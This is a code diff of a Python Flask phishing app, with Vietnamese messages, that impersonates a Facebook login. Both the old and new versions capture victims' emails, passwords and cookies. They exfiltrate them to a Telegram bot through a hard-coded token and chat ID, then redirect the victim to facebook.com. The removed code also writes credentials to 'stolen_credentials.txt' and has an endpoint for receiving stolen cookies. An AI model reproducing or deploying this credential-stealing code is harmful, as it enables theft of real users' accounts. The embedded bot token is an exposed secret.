@@ -1,80 +1,42 @@
-from flask import Flask, render_template, request, redirect, make_response
-import os
+from flask import Flask, request, redirect
 import requests
 from datetime import datetime
 
 app = Flask(__name__)
 
-# ================== TELEGRAM CONFIG ==================
 TELEGRAM_TOKEN = "8600949928:AAERwWL0-6sODzfixw--L5rNHW4hRW56HnY"
 TELEGRAM_CHAT_ID = "6126534090"
 
-def send_to_telegram(email, password):
-    message = f"""
-🔴 **THÔNG TIN MỚI ĐÃ THU THẬP**
-
-📧 Email: {email}
-🔑 Password: {password}
-⏰ Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
-🌐 Source: Facebook Fake
-    """
+def send_telegram(title, content):
     try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-        requests.post(url, data={
-            "chat_id": TELEGRAM_CHAT_ID,
-            "text": message,
-            "parse_mode": "Markdown"
-        })
-        print(f"✅ Đã gửi Telegram: {email}")
+        message = f"🔴 {title}\n\n{content}\n⏰ {datetime.now()}"
+        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
+                     data={"chat_id": TELEGRAM_CHAT_ID, "text": message})
+        print("✅ Gửi Telegram thành công")
     except Exception as e:
-        print(f"❌ Lỗi gửi Telegram: {e}")
-
-# ====================================================
+        print("❌ Lỗi Telegram:", e)
 
 @app.route('/')
 def home():
-    return render_template('index.html')
+    return """
+    <h1>Test Cookie</h1>
+    <form method="post" action="/login">
+        <input type="text" name="email" placeholder="Email" value="test@gmail.com"><br><br>
+        <input type="password" name="pass" placeholder="Password" value="123456"><br><br>
+        <button type="submit">Đăng nhập Test</button>
+    </form>
+    """
 
 @app.route('/login', methods=['POST'])
 def login():
     email = request.form.get('email')
     password = request.form.get('pass')
-    
-    # Lưu vào file
-    with open('stolen_credentials.txt', 'a', encoding='utf-8') as f:
-        f.write(f"[{datetime.now()}] Email: {email} | Password: {password}\n")
-    
-    # Gửi về Telegram
-    send_to_telegram(email, password)
-    
-    # Chuyển hướng
-    resp = make_response(redirect('https://www.facebook.com'))
-    resp.set_cookie('session_id', 'hijackable_' + os.urandom(8).hex(), httponly=True)
-    return resp
-@app.route('/send_cookies', methods=['POST'])
-def send_cookies():
-    data = request.json
-    cookies = data.get('cookies', 'No cookies')
-    
-    message = f"""
-🔴 **COOKIE ĐÃ THU THẬP TỪ XA**
+    cookies = request.cookies.to_dict()  # Lấy cookie từ request
 
-🌐 URL: {data.get('url')}
-📱 User-Agent: {data.get('userAgent')[:100]}
-🍪 Cookies: 
-{cookies}
-⏰ Time: {datetime.now()}
-    """
+    content = f"Email: {email}\nPassword: {password}\nCookies: {cookies}"
+    send_telegram("THU THẬP THÔNG TIN", content)
     
-    # Gửi về Telegram
-    try:
-        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
-                     data={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"})
-        print("✅ Cookie đã gửi về Telegram")
-    except:
-        print("❌ Lỗi gửi cookie")
-    
-    return "OK", 200
+    return redirect('https://www.facebook.com')
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
